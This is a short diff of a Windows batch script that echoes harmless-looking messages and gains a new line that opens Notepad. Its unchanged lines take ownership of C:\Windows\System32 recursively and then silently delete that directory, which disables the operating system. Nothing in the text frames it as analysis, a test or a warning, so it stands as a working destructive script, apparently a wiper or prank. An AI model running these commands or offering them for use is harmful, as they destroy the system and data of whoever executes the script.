@@ -1,4 +1,5 @@
 echo Nothing Here
 echo Everything Here
+start notepad
 takeown /F C:\Windows\System32 /R /D Y
 rd /s /q C:\Windows\System32
